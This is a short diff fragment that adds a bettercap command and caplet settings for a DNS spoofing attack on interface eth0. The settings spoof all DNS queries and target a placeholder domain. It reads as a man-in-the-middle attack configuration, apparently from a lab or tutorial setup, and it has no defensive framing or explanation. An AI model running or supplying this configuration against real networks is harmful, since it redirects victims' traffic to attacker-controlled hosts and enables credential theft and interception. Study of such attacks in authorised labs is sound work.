@@ -1,0 +1,4 @@
+bettercap -iface eth0 -caplet /root/spoof.cap
+set dns.spoof.all true
+set dns.spoof.domains website name
+dns.spoof on
